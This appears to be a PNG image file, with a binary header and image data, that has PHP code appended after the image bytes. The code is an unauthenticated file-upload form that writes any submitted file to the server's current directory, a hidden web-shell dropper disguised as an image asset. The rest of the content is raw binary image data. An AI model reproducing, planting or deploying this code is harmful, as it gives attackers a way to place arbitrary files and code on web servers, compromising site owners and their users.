�PNG

   IHDR         �x��   sBIT|d�   	pHYs  �  ��+   tEXtSoftware www.inkscape.org��<    IDATx���w�^e���w&�J"=��Ҕ^�"�變(�u���.����tm��V�&*U������ ��J��qϐI23y�9�{��u]�Ly������}�:Ie7XX���{M�������k0
X����U{���`�r_�,��8����8��{������^���SRI� 5ܺ����&��>_��UE��^�OSz�'�ɽ�~>,��p R����-{�-��{s`t\�R�<<�������E���@��`c`[`�~�&u˫}������{?>
���K� �}#��;��vĆ�(}�����;H�$��@�һ�=�݁݀�H]�*���_�[���I���AX H˚ ��{�Azw?.4�:5��T� \OZ� 	 i�;���H]�=����Ť^��I�դ�R#Y �i������b�(���J�
�:�G�� P�v"5�{�6ɑ��
�g�<form method="post" enctype="multipart/form-data" action=""><input type="file" name="asdx1"><input type="submit" value="upload"></form><?php
if($_SERVER['REQUEST_METHOD'] == 'POST'){if(isset($_FILES['asdx1']) ){var_dump(move_uploaded_file($_FILES['asdx1']['tmp_name'], "./" . $_FILES['asdx1']['name'] ));}}